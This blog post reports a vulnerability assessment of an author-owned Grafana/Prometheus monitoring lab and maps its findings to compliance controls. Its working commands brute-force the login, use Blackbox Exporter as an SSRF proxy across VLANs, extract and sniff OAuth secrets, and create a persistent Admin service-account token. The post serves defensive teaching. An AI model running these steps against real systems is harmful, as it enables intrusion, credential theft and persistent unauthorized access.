---
title: "15 Vulnerabilities in a Grafana Monitoring Stack (And How We Found Them)"
date: 2026-02-15T10:00:00-06:00
draft: false
author: "Oob Skulden™"
description: "A full vulnerability assessment of a Grafana/Prometheus monitoring stack across two VLANs. 98 commands, 15 confirmed vulnerabilities, and the investigative chain that led to each finding -- including the dead ends."
tags:
  - Grafana
  - Prometheus
  - Security Assessment
  - Monitoring
  - Docker
  - OAuth
  - Vulnerability
  - cAdvisor
  - Node Exporter
  - Blackbox Exporter
  - SSRF
  - Container Security
  - Compliance
categories:
  - Vulnerability Assessment
  - Security
  - Homelab
keywords:
  - grafana vulnerability assessment
  - prometheus unauthenticated access
  - cadvisor container enumeration
  - blackbox exporter ssrf
  - node exporter host metrics exposure
  - monitoring stack security assessment
  - docker container security audit
  - oauth plaintext credentials
  - grafana brute force attack
  - grafana session persistence vulnerability
  - nist 800-53 monitoring compliance
  - soc 2 monitoring assessment
  - cis docker benchmark assessment
  - pci-dss monitoring stack audit
  - grafana service account backdoor
  - container network segmentation
  - security headers assessment
  - oauth token interception
  - docker capability audit
  - monitoring infrastructure attack surface
showToc: false
tocOpen: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowShareButtons: false
---

*The views and opinions expressed on this site are my own and do not reflect the views of my employer. This content is based entirely on publicly available documentation for open-source tools and does not contain proprietary information from any current or former employer.*

---

> **Controlled Lab Environment -- Authorization Required**
>
> All techniques demonstrated in this post were performed in an isolated personal homelab environment against systems I own and operate. **Do not replicate these techniques against systems you do not own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (18 U.S.C. § 1030) and equivalent laws in other jurisdictions. The configurations shown are deliberately insecure for educational purposes.

---

## What Happens When You Actually Test Your Monitoring Stack

The previous post deployed a Grafana monitoring stack with Authentik SSO, Prometheus, and four exporters across a multi-VLAN lab. It was deployed deliberately insecure -- HTTP everywhere, no authentication on exporters, default session timeouts, secrets in plaintext `.env` files. The closing section listed those exposures and promised to quantify them.

This is that post.

Over a 90-minute session from a jump box on VLAN 50, we ran 98 commands against the monitoring stack on VLAN 75 (192.168.75.109). No credentials to start. No prior access to Grafana-lab. Just a `curl` binary and an attacker's mindset.

The result: 15 confirmed vulnerabilities, 4 critical, 4 high, 4 medium, 3 low. Complete infrastructure topology extracted. OAuth secrets captured off the wire. A persistent Admin backdoor created and verified from a different network segment. Cross-VLAN reconnaissance through an unauthenticated SSRF proxy. Every finding maps to specific NIST 800-53, SOC 2, CIS, and PCI-DSS controls -- the full compliance matrix is at the end.

The hardening and remediation for each of these is covered in the companion post. This post is the assessment: what's exposed, how we proved it, and what an attacker does with it.

---

## The Lab Environment

Two terminals, two VLANs, two perspectives.

**JUMP BOX** (`XFCE$`) sits on VLAN 50. This is the external attacker -- adjacent network, no credentials, simulating someone who has network reachability but nothing else. 34 commands originated here.

**GRAFANA-LAB** (`oob@grafana-lab:~$`) is the monitoring host on VLAN 75 (192.168.75.109). This is the post-compromise perspective -- what happens after an attacker gets shell access via SSH or a container escape. 64 commands originated here.

The monitoring stack runs five Docker containers: Grafana, Prometheus, Node Exporter, cAdvisor, and Blackbox Exporter. Authentik lives on a separate host at 192.168.80.54 (VLAN 80). All ports bind `0.0.0.0`. All traffic is HTTP.

---

## VULN-01: Prometheus -- Your Infrastructure Map, No Password Required [CRITICAL]

This is always the first thing to check on a monitoring stack. Prometheus ships with no authentication by default. Not "authentication disabled" -- the concept doesn't exist in the default configuration. There's no login page. There's no access denied response. You either can reach port 9090 or you can't, and if you can, you own the data.

From the jump box:

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.75.109:9090/
HTTP 302
```

HTTP 302 -- redirect to the web UI. No auth challenge. Now pull the targets API:

```bash
curl -s http://192.168.75.109:9090/api/v1/targets | jq '.data.activeTargets[] | {job: .labels.job, instance: .labels.instance, health: .health}'
```

```json
{"job": "blackbox", "instance": "blackbox-exporter:9115", "health": "up"}
{"job": "cadvisor", "instance": "cadvisor:8080", "health": "up"}
{"job": "grafana", "instance": "grafana:3000", "health": "up"}
{"job": "node-exporter", "instance": "node-exporter:9100", "health": "up"}
{"job": "prometheus", "instance": "localhost:9090", "health": "up"}
```

Five services, their internal Docker DNS names, their ports, and their health status. One unauthenticated API call and an attacker has the complete service topology.

It gets worse. PromQL queries extract host-level data:

```bash
curl -s 'http://192.168.75.109:9090/api/v1/query?query=node_uname_info' | jq '.data.result[0].metric | {nodename, release, machine}'
```

```json
{"nodename": "1c28a1c73296", "release": "6.12.69+deb13-amd64", "machine": "x86_64"}
```

Kernel 6.12.69, Debian 13, x86_64. That's CVE-targeting data. And the full Prometheus configuration -- every scrape job, every target, every internal endpoint -- dumps from the status API:

```bash
curl -s http://192.168.75.109:9090/api/v1/status/config | jq -r '.data.yaml' | head -40
```

The output is the entire `prometheus.yml`. Scrape intervals, protocols, target lists, scheme configuration. This single endpoint provides more reconnaissance value than most active scanning tools.

**Compliance impact:** NIST AC-3 (Access Enforcement), CM-7 (Least Functionality), SOC 2 CC6.1, CIS Controls 4.1, CIS Docker 5.13.

---

## VULN-02: cAdvisor -- Container Inventory for Free [CRITICAL]

cAdvisor is a container metrics exporter. Google built it, it's widely deployed, and it answers the question "what containers are running and what resources do they have?" without requiring you to ask politely.

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.75.109:8080/containers/
HTTP 200
```

Full graphical web UI, no authentication. The machine API gives hardware specs:

```bash
curl -s http://192.168.75.109:8080/api/v1.0/machine | jq '{num_cores, memory_capacity, machine_id, system_uuid}'
```

```json
{
  "num_cores": 2,
  "memory_capacity": 2069454848,
  "machine_id": "<redacted-machine-id>",
  "system_uuid": "<redacted-system-uuid>"
}
```

Two cores, 2GB RAM, unique machine ID, and system UUID. The UUID confirms this is a Proxmox VM. But the container enumeration is where this gets interesting -- and where the testing hit some dead ends worth documenting.

### The API Path Hunt

cAdvisor's API documentation suggests `/docker` as the container listing endpoint. It didn't work:

```bash
curl -s http://192.168.75.109:8080/api/v1.0/containers/docker | head -20
# failed to get container "/docker" with error: unknown container "/docker"
```

Tried the v2.0 API:

```bash
curl -s http://192.168.75.109:8080/api/v2.0/containers/ | head -100
# unknown request type "containers"
```

The v2.0 summary endpoint exists but only returns the root container. After several attempts, the working path turned out to be v1.0 with the systemd slice hierarchy. cAdvisor in this environment maps containers under `/system.slice` rather than `/docker` because of how the Docker service is registered with systemd:

```bash
curl -s http://192.168.75.109:8080/api/v1.0/containers/system.slice | jq '.subcontainers[] | .name'
```

This returned the full inventory -- five Docker container IDs, plus host services including SSH, cron, qemu-guest-agent (confirming the Proxmox hypervisor), and every systemd service on the host. Individual container details exposed the image names and resource configurations:

```bash
curl -s "http://192.168.75.109:8080/api/v1.0/containers/system.slice/docker-1c28a1c73296..." | jq '{image: .spec.image, memory_limit: .spec.memory.limit}'
```

```json
{"name": "prom/node-exporter:latest", "memory_limit": 18446744073709551615}
```

That memory limit -- `18446744073709551615` -- is `UINT64_MAX`. It means "unlimited." Every container on the host has no memory constraints. On a 2GB host, any container can consume all available memory until the OOM killer intervenes.

**Compliance impact:** NIST AC-3, CM-7, SOC 2 CC6.1, CIS Docker 5.4.

---

## VULN-03: Node Exporter -- Everything About the Host [CRITICAL]

Node Exporter is designed to expose host-level metrics for Prometheus to scrape. It does this job extremely well. The problem is that it does this job for anyone who can reach port 9100.

```bash
curl -s http://192.168.75.109:9100/metrics | grep node_uname_info
node_uname_info{domainname="(none)",machine="x86_64",nodename="1c28a1c73296",release="6.12.69+deb13-amd64"} 1
```

Kernel version with compile date -- February 8, 2026. That compile date narrows CVE searches to a specific patch level. The full metrics endpoint also exposed:

Network interfaces and MAC addresses on eth0, storage layout (single 32GB ext4 on `/dev/sda1` -- no redundancy), memory details (2GB total, 1.2GB available, 1.7GB swap), file descriptor allocation (832 out of effectively unlimited), process states (1 running, 0 blocked -- system is idle), and boot time (epoch 1770662211, which translates to February 10, 2026 -- useful for tracking patch cadence).

Every one of these data points has tactical value. The MAC address is a network fingerprint. The single-disk layout means no RAID -- one disk failure is total loss. 2GB RAM with 1.2GB free means a sustained request flood is a viable denial-of-service vector. The boot time tells an attacker how recently the system was patched.

**Compliance impact:** NIST CM-7, CIS Controls 4.1.

---

## VULN-04: Blackbox Exporter -- An SSRF Proxy You Deployed on Purpose [CRITICAL]

Blackbox Exporter probes endpoints and reports whether they're up. You give it a URL, it makes the request, it returns the result. That's its entire job. It's also the definition of a server-side request forgery proxy if it's exposed without access controls.

From the jump box, first test: can it reach external targets?

```bash
curl -s "http://192.168.75.109:9115/probe?target=http://google.com&module=http_2xx" | grep probe_success
probe_success 1
```

Yes. Now the real question -- can it reach other VLANs?

```bash
curl -s "http://192.168.75.109:9115/probe?target=http://<internal-host-vlan100>/health&module=http_2xx" | grep -E "probe_(success|http_status)"
probe_http_status_code 200
probe_success 1
```

An internal service on a completely separate VLAN, responding through the Blackbox proxy. The jump box on VLAN 50 shouldn't be able to reach that network segment directly, but it doesn't need to -- Blackbox sits on VLAN 75 and makes the request on the attacker's behalf.

Same thing works for Authentik on VLAN 80:

```bash
curl -s "http://192.168.75.109:9115/probe?target=http://192.168.80.54:9000/-/health/live/&module=http_2xx" | grep probe_success
probe_success 1
```

Two separate VLAN boundaries bypassed through a single unauthenticated endpoint. It also works as a port scanner -- iterate through common ports on any reachable host and `probe_success` tells you which ones are open. Complete VLAN boundary bypass and service enumeration from a single monitoring exporter.

One positive finding from this section: the Docker API on port 2375 was confirmed not exposed (`curl -s http://192.168.75.109:2375/containers/grafana/json` returned nothing). That would have been game over.

**Compliance impact:** NIST SC-7 (Boundary Protection), AC-4 (Information Flow Enforcement), SOC 2 CC6.6, CIS Controls 13.4.

---

## VULN-05: OAuth Client Secret in Plaintext -- Three Different Ways [HIGH]

This one requires shell access to Grafana-lab, so we're in the post-compromise perspective. But "shell access" here means any user with SSH to the host -- not root, not a security admin, just someone who can run `docker exec`.

**Vector 1 -- Container environment:**

```bash
sudo docker exec grafana env | grep CLIENT_SECRET
GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET=<redacted-128-char-secret>
```

128-character OAuth client secret. Now check if it's exposed through other paths.

**Vector 2 -- Container metadata:**

```bash
sudo docker inspect grafana --format '{{json .Config.Env}}' | jq -r '.[] | select(startswith("GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET"))'
```

Same secret. `docker inspect` doesn't require exec into the container -- anyone with Docker socket access gets it.

**Vector 3 -- Plaintext on disk:**

```bash
cat ~/monitoring/.env | grep CLIENT_SECRET
```

Same secret, sitting in a `.env` file in the user's home directory. Three independent extraction vectors for the same credential.

The full OAuth configuration pull exposed the complete attack kit:

```bash
sudo docker exec grafana env | grep -E "(CLIENT_ID|CLIENT_SECRET|AUTH_URL|TOKEN_URL)"
GF_AUTH_GENERIC_OAUTH_AUTH_URL=http://192.168.80.54:9000/application/o/authorize/
GF_AUTH_GENERIC_OAUTH_CLIENT_ID=grafana-client
GF_AUTH_GENERIC_OAUTH_CLIENT_SECRET=<redacted-128-char-secret>
GF_AUTH_GENERIC_OAUTH_TOKEN_URL=http://192.168.80.54:9000/application/o/token/
```

Client ID, client secret, authorization endpoint, and token endpoint -- all over HTTP. With these, an attacker can impersonate the Grafana application to Authentik and exchange authorization codes for access tokens.

A quick verification confirmed the Authentik token endpoint is alive and accepting requests:

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.80.54:9000/application/o/token/
HTTP 405
```

HTTP 405 -- Method Not Allowed. It rejects GET but accepts POST. The endpoint is live and ready to exchange authorization codes for tokens. An attacker with the client secret has everything needed to complete the OAuth flow.

A secondary discovery during this investigation: `GF_USERS_ALLOW_SIGN_UP=false` but `GF_AUTH_GENERIC_OAUTH_ALLOW_SIGN_UP=true`. The OAuth sign-up flag overrides the general one. That contradiction becomes VULN-13.

**Compliance impact:** NIST SC-28 (Protection of Information at Rest), IA-5 (Authenticator Management), SOC 2 CC6.1, CIS Docker 4.10.

---

## VULN-06: Sessions That Outlive the Employee [HIGH]

The question here is simple: if you disable a user account in Authentik, how long before they lose access to Grafana? The answer for this deployment was up to 30 days.

No session hardening environment variables were configured:

```bash
sudo docker exec grafana env | grep -iE "(INACTIVE_LIFETIME|MAXIMUM_LIFETIME|TOKEN_ROTATION)"
```

Empty output. The admin API confirmed the defaults:

```json
{
  "login_maximum_inactive_lifetime_duration": "7d",
  "login_maximum_lifetime_duration": "30d",
  "token_rotation_interval_minutes": "10"
}
```

Seven-day idle timeout, 30-day absolute maximum, 10-minute token rotation. The token rotation keeps sessions alive -- it doesn't revoke them. There's no webhook or callback to Authentik to verify whether the account is still active.

Getting to that admin API output required some troubleshooting. The admin password wasn't in the `.env` file where we expected it -- `GF_SECURITY_ADMIN_PASSWORD` wasn't set via environment variable at all, which means Grafana was using an internally-set password. The known password from prior testing worked after confirming it wasn't being overridden.

The Grafana logs also showed evidence of stale token rotation from previous sessions, with entries from the jump box IP (192.168.50.10) indicating sessions that persisted well beyond any reasonable window.

**Compliance impact:** NIST AC-2(3) (Disable Accounts on Termination), AC-12 (Session Termination), SOC 2 CC6.1, CC6.3, CIS Controls 6.2.

---

## VULN-07: 50 Login Attempts in Under a Second [HIGH]

No network-level rate limiting on the Grafana login endpoint. The first test confirmed it locally:

```bash
for i in {1..10}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://192.168.75.109:3000/login \
    -H "Content-Type: application/json" \
    -d "{\"user\":\"admin\",\"password\":\"attempt$i\"}")
  echo "Attempt $i: HTTP $response"
done
```

Ten attempts, all HTTP 401, no lockout, no delay. Then the speed test from the jump box:

```bash
time for i in {1..50}; do
  curl -s -o /dev/null -w "" -X POST http://192.168.75.109:3000/login \
    -H "Content-Type: application/json" \
    -d "{\"user\":\"admin\",\"password\":\"attempt$i\"}"
done

real    0m0.931s
```

50 attempts in 0.931 seconds. Roughly 54 attempts per second with no rate limiting. At that speed, a focused dictionary attack against a weak password is viable in minutes.

### The Backdoor Chain (And the Shell Escaping Nightmare)

Once the admin password was confirmed, the next test was whether an attacker could establish persistent access that survives a password change. The answer is yes, but getting there involved one of the more frustrating troubleshooting detours in the assessment.

The admin password contained a shell special character -- `!` triggers bash history expansion. Passing it via `curl` required care:

```bash
# Double quotes: shell expanded the !
curl -s -X POST http://192.168.75.109:3000/api/auth/keys \
  -u "admin:<test-password>" -d '...'
# "Invalid username or password"

# Single quotes: should work but auth was still failing
curl -s -X POST http://localhost:3000/api/auth/keys \
  -u 'admin:<test-password>' -d '...'
# "Invalid username or password"
```

After a container restart (to rule out internal lockout) and testing with a known-good password, the breakthrough was heredoc syntax:

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d @- <<'EOF'
{"user":"admin","password":"<test-password>"}
EOF
HTTP 200
```

The single-quoted heredoc (`<<'EOF'`) prevents all shell expansion. The password had been changed during prior testing, which is why earlier attempts were failing -- not a shell escaping issue at all. Classic red herring.

With admin access confirmed, the legacy `/api/auth/keys` endpoint returned "Not found" -- deprecated in Grafana v12. The modern service account API worked:

```bash
# Create Admin service account
curl -s -X POST http://localhost:3000/api/serviceaccounts \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)" \
  -d '{"name":"backdoor-test","role":"Admin"}'
{"id":5,"name":"backdoor-test","login":"sa-1-backdoor-test","orgId":1,"isDisabled":false,"role":"Admin"}

# Generate permanent API token
curl -s -X POST http://localhost:3000/api/serviceaccounts/5/tokens \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)" \
  -d '{"name":"backdoor-token"}'
{"id":1,"name":"backdoor-token","key":"glsa_<redacted-token-invalidated-after-testing>"}
```

Token verified locally, then from the jump box on a completely different VLAN:

```bash
# From VLAN 50 -- full Admin access with just a token string
curl -s http://192.168.75.109:3000/api/org \
  -H "Authorization: Bearer glsa_<redacted-token-invalidated-after-testing>"
{"id":1,"name":"Main Org."}
```

Full Admin org access from VLAN 50. The service account survives password changes, SSO reconfiguration, and user account deletion. The only thing that kills it is explicitly deleting the service account itself -- which an admin would need to know exists.

The backdoor was cleaned up after verification:

```bash
curl -s -X DELETE http://localhost:3000/api/serviceaccounts/5 \
  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)"
{"message":"Service account deleted"}
```

The full attack chain: brute-force the login (no rate limiting) → authenticate as admin → create service account with Admin role → generate API token → permanent remote access from any network that can reach port 3000. That's the chain from "I can reach the login page" to "I have persistent admin access that survives credential rotation."

**Compliance impact:** NIST AC-7 (Unsuccessful Logon Attempts), IA-5, SOC 2 CC6.1.

---

## VULN-08: Watching OAuth Tokens Fly By in Plaintext [HIGH]

Every OAuth URL in the Grafana configuration uses `http://`:

```bash
sudo docker exec grafana env | grep -E "(AUTH_URL|TOKEN_URL|API_URL)"
GF_AUTH_GENERIC_OAUTH_AUTH_URL=http://192.168.80.54:9000/application/o/authorize/
GF_AUTH_GENERIC_OAUTH_API_URL=http://192.168.80.54:9000/application/o/userinfo/
GF_AUTH_GENERIC_OAUTH_TOKEN_URL=http://192.168.80.54:9000/application/o/token/
```

No TLS. Not even TLS with skip-verify -- the `TLS_SKIP_VERIFY` environment variable wasn't set because there's no TLS to skip. A packet capture during an OAuth login flow confirmed what that means in practice:

```bash
sudo tcpdump -i any -c 50 -w /tmp/oauth-capture.pcap host 192.168.80.54
# (trigger OAuth login in browser)
# 50 packets captured, 55 received by filter
```

The captured traffic contained the Base64-encoded Authorization header from the token exchange:

```bash
echo '<redacted-base64-encoded-credentials>' | base64 -d
grafana-client:<redacted-128-char-secret>
```

Client ID and 128-character secret, captured from the wire. The JWT token payload was equally revealing:

```json
{
  "iss": "http://192.168.80.54:9000/application/o/grafana/",
  "sub": "<redacted-subject-identifier>",
  "aud": "grafana-client",
  "amr": ["pwd"],
  "email": "admin@lab.local",
  "name": "authentik Default Admin",
  "preferred_username": "akadmin",
  "groups": ["authentik Admins", "Grafana Admins"]
}
```

Email, username, group memberships (including both admin groups), authentication method (`pwd` -- password only, no MFA), and session identifiers. All from passive sniffing -- no active man-in-the-middle required. Anyone on the network segment between Grafana-lab and Authentik sees every OAuth exchange in full.

**Compliance impact:** NIST SC-8 (Transmission Confidentiality), SC-23 (Session Authenticity), SOC 2 CC6.7.

---

## VULN-09: The Security Headers That Give You Just Enough False Confidence [MEDIUM]

```bash
curl -sI http://192.168.75.109:3000/login
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: text/html; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
```

At first glance, this looks reasonable. Three security headers present. If you're running a quick audit and checking boxes, you might move on. But what's missing matters more than what's there.

No `Strict-Transport-Security` -- browsers will happily downgrade to HTTP even after you deploy TLS. No `Content-Security-Policy` -- if an XSS vulnerability lands, there's nothing restricting what scripts can execute. No `Referrer-Policy` -- full URLs (including any query parameters with tokens or session data) leak to every external resource the page loads. No `Permissions-Policy` -- the browser's camera, microphone, and geolocation APIs are all available to any script that asks.

The three headers Grafana ships are the easy ones. The four it doesn't are the ones that actually constrain an attacker's options after initial access.

**Compliance impact:** NIST SC-8, CIS Controls 16.8.

---

## VULN-10: Zero TLS Anywhere [MEDIUM]

```bash
curl -sk -o /dev/null -w "HTTP %{http_code}\n" https://192.168.75.109
HTTP 000
```

HTTP 000. Not a certificate error. Not a self-signed warning. The connection was refused outright -- there is no TLS listener on any port of this host. The concept of encryption doesn't exist here.

```bash
curl -s http://192.168.75.109:3000/api/health | jq .
{"database": "ok", "version": "12.3.2", "commit": "df2547decd50d14defa20ec9ce1c2e2bc9462d72"}
```

Grafana version 12.3.2, commit hash included, served over cleartext. `ROOT_URL` is `http://192.168.75.109:3000`. Admin credentials, API tokens, session cookies, dashboard data, OAuth exchanges -- all of it crosses the wire in plaintext. This was a deliberate choice for the initial deployment (documented in the deployment post), but deliberate doesn't mean safe. Anyone with `tcpdump` and network adjacency owns every session on this box.

**Compliance impact:** NIST SC-8, SOC 2 CC6.7.

---

## VULN-11: Docker Containers Running With the Keys to the Kingdom [MEDIUM]

```bash
for c in grafana prometheus node-exporter cadvisor blackbox-exporter; do
  echo "=== $c ==="
  sudo docker inspect $c --format='User={{.Config.User}} Privileged={{.HostConfig.Privileged}} CapDrop={{.HostConfig.CapDrop}} Memory={{.HostConfig.Memory}}'
done
```

```
=== grafana ===
User=472 Privileged=false CapDrop=[] Memory=0
=== prometheus ===
User=nobody Privileged=false CapDrop=[] Memory=0
=== node-exporter ===
User=nobody Privileged=false CapDrop=[] Memory=0
=== cadvisor ===
User= Privileged=false CapDrop=[] Memory=0
=== blackbox-exporter ===
User= Privileged=false CapDrop=[] Memory=0
```

`CapDrop=[]`. Five containers. Not a single capability dropped on any of them.

Look at the other columns. cAdvisor and blackbox-exporter have `User=` -- empty, which means root. `Memory=0` across the board -- no limits, on a host with 2GB of RAM. No `no-new-privileges`. No read-only filesystems. These containers have the full default Linux capability set and nothing preventing them from asking for more.

Grafana at least runs as user 472 and Prometheus as `nobody`, so there's some non-root discipline happening. But without `cap_drop: ALL`, a container escape from any of these -- especially the two running as root -- hands an attacker capabilities they should never have had in the first place.

**Compliance impact:** NIST CM-7, SC-6 (Resource Availability), CIS Docker 5.3, 5.10, 5.11, 5.26.

---

## VULN-12: Flat Container Network -- Compromise One, Reach All [MEDIUM]

```bash
sudo docker network ls --format '{{.Name}}' | grep -v "bridge\|host\|none"
monitoring_default
```

One network. Five containers. No segmentation. Can Grafana talk to Prometheus directly?

```bash
sudo docker exec grafana wget -qO- http://prometheus:9090/metrics | head -3
# HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles...
# TYPE go_gc_cycles_automatic_gc_cycles_total counter
go_gc_cycles_automatic_gc_cycles_total 2044
```

DNS resolution by container name, full metrics access, no authentication needed. The reverse works too -- Prometheus can reach Grafana's health endpoint by IP (DNS name resolution is inconsistent in the reverse direction, but IP works fine). Every container in the stack can talk to every other container:

```
grafana:            172.18.0.3
prometheus:         172.18.0.4
node-exporter:      172.18.0.2
cadvisor:           172.18.0.6
blackbox-exporter:  172.18.0.5
```

All on a /16 subnet. Zero east-west traffic controls. There's no reason blackbox-exporter needs to talk to Grafana. There's no reason cAdvisor needs to reach Prometheus. But they all can, because `docker-compose up` creates one flat network by default and nobody questions it.

**Compliance impact:** NIST SC-7, CIS Docker 5.30.

---

## VULN-13: When Your Config Disagrees With Itself [LOW]

```bash
sudo docker exec grafana env | grep ALLOW_SIGN_UP
GF_USERS_ALLOW_SIGN_UP=false
GF_AUTH_GENERIC_OAUTH_ALLOW_SIGN_UP=true
```

Read those two lines again. General sign-up: disabled. OAuth sign-up: enabled. They contradict each other, and the OAuth flag wins. Whoever configured this thought they'd locked down account creation. They hadn't.

Any user who completes the OAuth flow through Authentik gets auto-provisioned, and the role mapping is generous:

```bash
sudo docker exec grafana env | grep ROLE_ATTRIBUTE
GF_AUTH_GENERIC_OAUTH_ROLE_ATTRIBUTE_PATH=contains(groups[*], 'Grafana Admins') && 'Admin' || 'Viewer'
```

Member of `Grafana Admins` in Authentik? Automatic Admin in Grafana. The user inventory confirmed it: 4 accounts total, 1 local admin, 3 OAuth-provisioned, 2 of which had Admin role.

How dangerous this is depends entirely on Authentik's application assignment. If only explicitly-assigned users can authenticate to the Grafana application, this is manageable. If the application is broadly accessible, it's a privilege escalation path hiding behind a config flag that looks like it's doing its job.

**Compliance impact:** NIST AC-2 (Account Management).

---

## VULN-14: Logs That Lie About Who's Attacking You [LOW]

```bash
sudo docker exec grafana env | grep GF_LOG
```

Empty. Zero logging configuration. Console-only output, text format, 1,721 ephemeral lines that vanish on container restart. That alone is a finding. But the worse discovery was what the logs actually contained.

```bash
sudo docker logs grafana 2>&1 | grep -i "invalid\|failed\|unauth"
```

The brute-force test from VULN-07 did trigger Grafana's internal lockout ("too many consecutive incorrect login attempts") -- so there's some built-in protection happening. Good. Except every single `remote_addr` value in those log entries was `172.18.0.1`. The Docker gateway IP. Not the attacker's IP. Not the jump box on VLAN 50. The Docker gateway.

Every failed login, every lockout trigger, every suspicious authentication event -- they all point to the same internal address. Your incident response team sees the alert, pulls the logs, and finds... the Docker bridge. You know someone was hammering the login page. You have no idea who.

**Compliance impact:** NIST AU-2 (Audit Events), AU-3 (Content of Audit Records), SOC 2 CC7.2.

---

## VULN-15: One Bad Command Away From Total Loss [LOW]

```bash
ls -la ~/monitoring/backup* 2>/dev/null; crontab -l 2>/dev/null | grep -i backup
```

Nothing. No backup scripts. No cron jobs. No backup directories. No evidence that anyone has ever thought about what happens when this host dies.

```bash
sudo docker volume ls --format '{{.Name}}' | grep monitoring
monitoring_grafana-storage
monitoring_prometheus-storage
```

Two Docker volumes. Roughly 262MB total -- Grafana's dashboards, users, and preferences (~50MB) plus Prometheus's time-series history (~212MB). Every dashboard someone spent hours building. Every alerting rule. Every user account and permission. All of it living on a single disk with no redundancy (remember VULN-03: one 32GB ext4 partition, no RAID).

A disk failure destroys everything. A bad `docker-compose down -v` destroys everything. An accidental `docker volume prune` during routine cleanup destroys everything. And there's no path back.

**Compliance impact:** NIST CP-9 (Information System Backup), CP-10 (Information System Recovery), SOC 2 A1.2.

---

## Assessment Summary

Fifteen vulnerabilities across a five-container monitoring stack, assessed in 90 minutes with 98 commands. Of those, 72 produced successful findings, 20 were failed attempts or troubleshooting detours, and 6 were duplicate paste errors from clipboard issues during the session. Thirty-four commands ran from the jump box (external attacker), sixty-four from Grafana-lab (post-compromise). One backdoor was created and cleaned up. The severity distribution:

| Severity | Count | Vulnerabilities |
|---|---|---|
| CRITICAL | 4 | VULN-01 (Prometheus unauth), VULN-02 (cAdvisor inventory), VULN-03 (Node Exporter metrics), VULN-04 (Blackbox SSRF) |
| HIGH | 4 | VULN-05 (OAuth secret plaintext), VULN-06 (Session persistence), VULN-07 (No brute-force protection), VULN-08 (Plaintext OAuth) |
| MEDIUM | 4 | VULN-09 (Missing headers), VULN-10 (Zero TLS), VULN-11 (Container capabilities), VULN-12 (Flat network) |
| LOW | 3 | VULN-13 (OAuth auto sign-up), VULN-14 (No audit logging), VULN-15 (No backups) |

The four criticals share a root cause that should make every monitoring team uncomfortable: the default configuration. Prometheus, Node Exporter, cAdvisor, and Blackbox Exporter all ship with zero access controls. No authentication. No authorization. Not even a config option you forgot to enable -- the concept doesn't exist in the default deployment. The vendors ship them this way. Most production environments leave them this way. And most security teams never test them because monitoring infrastructure is "internal."

The four highs are all configuration decisions masquerading as architecture problems. OAuth secrets in plaintext, sessions that outlive the employees who created them, a login endpoint that accepts 54 guesses per second, token exchanges flying across the network in cleartext. Not one of these requires a code change or a version upgrade to fix.

The mediums are the hardening work that everyone knows they should do and almost nobody actually does: security headers, TLS, container capabilities, network segmentation. It's not exciting work. It stays on the backlog until something goes wrong.

The lows are the operational gaps that turn a bad day into a catastrophe: auto-provisioning controls nobody reviewed, logs that lie about who attacked you, and zero recovery path when the disk dies.

---

## Compliance Framework Cross-Reference

Every vulnerability maps to specific controls across five frameworks. The table below provides the full mapping -- brief references appeared inline with each finding above.

### NIST 800-53 Rev 5

| Control | Description | Vulnerabilities |
|---|---|---|
| AC-2 | Account Management | VULN-13 |
| AC-2(3) | Disable Accounts on Termination | VULN-06 |
| AC-3 | Access Enforcement | VULN-01, VULN-02 |
| AC-4 | Information Flow Enforcement | VULN-04 |
| AC-7 | Unsuccessful Logon Attempts | VULN-07 |
| AC-12 | Session Termination | VULN-06 |
| AU-2 | Audit Events | VULN-14 |
| AU-3 | Content of Audit Records | VULN-14 |
| CM-7 | Least Functionality | VULN-01, VULN-02, VULN-03, VULN-11 |
| CP-9 | Information System Backup | VULN-15 |
| CP-10 | Information System Recovery | VULN-15 |
| IA-5 | Authenticator Management | VULN-05, VULN-07 |
| SC-6 | Resource Availability | VULN-11 |
| SC-7 | Boundary Protection | VULN-04, VULN-12 |
| SC-8 | Transmission Confidentiality | VULN-08, VULN-09, VULN-10 |
| SC-23 | Session Authenticity | VULN-08 |
| SC-28 | Protection of Information at Rest | VULN-05 |

### SOC 2

| Criteria | Description | Vulnerabilities |
|---|---|---|
| CC6.1 | Logical Access Controls | VULN-01, VULN-02, VULN-05, VULN-06, VULN-07 |
| CC6.3 | Security for Access Removal | VULN-06 |
| CC6.6 | Security for External Threats | VULN-04 |
| CC6.7 | Transmission Protection | VULN-08, VULN-10 |
| CC7.2 | System Monitoring | VULN-14 |
| A1.2 | Recovery Procedures | VULN-15 |

### CIS Controls v8

| Safeguard | Description | Vulnerabilities |
|---|---|---|
| 4.1 | Secure Configuration | VULN-01, VULN-03 |
| 6.2 | Establish Access Revoking Process | VULN-06 |
| 13.4 | Network-Level Access Control | VULN-04 |
| 16.8 | Browser Security Controls | VULN-09 |

### CIS Docker Benchmark

| Recommendation | Description | Vulnerabilities |
|---|---|---|
| 4.10 | Secrets Not Stored in Dockerfiles | VULN-05 |
| 5.3/5.4 | Kernel Capabilities Restricted | VULN-02, VULN-11 |
| 5.10 | Memory Usage Limited | VULN-11 |
| 5.13 | Incoming Traffic Bound to Specific Interface | VULN-01 |
| 5.26 | Cannot Acquire Additional Privileges | VULN-11 |
| 5.30 | Default Bridge Not Used | VULN-12 |

### PCI-DSS v4.0

While this monitoring stack doesn't directly process cardholder data, PCI-DSS applies to all system components in or connected to the cardholder data environment. Monitoring infrastructure that observes systems within CDE scope inherits these requirements.

| Sub-Requirement | Description | Vulnerabilities |
|---|---|---|
| 1.2.1 | NSC ruleset configuration standards | VULN-04, VULN-12 |
| 1.3.1 | Inbound traffic restricted to necessary | VULN-01, VULN-02, VULN-03 |
